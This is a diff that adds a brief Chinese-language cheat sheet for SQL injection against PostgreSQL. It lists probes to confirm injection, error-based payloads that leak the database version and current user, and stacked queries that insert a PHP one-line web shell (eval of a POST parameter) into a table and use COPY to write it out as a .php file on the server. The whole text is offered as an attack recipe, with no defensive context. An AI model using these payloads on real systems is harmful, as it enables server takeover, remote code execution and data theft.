@@ -1,0 +1,11 @@
+判断注入
+' 报错
+and 1=1 返回正常 
+and 1=2 返回不正常
+
+and 1=cast(version() as int)  获取数据库版本信息系统信息
+and 1=cast(user||123 as int)  获取当前用户名称 postgres相当于root
+参数段;create table xxx(w text not null); 创建表xxx
+参数段;insert into xxx values($$<?php @eval($_POST[key]);?>$$);   向xxx表插入一句话
+参数段;copy xxx(w) to $$/路径/../xxx.php$$;  将表内容导出至文件
+
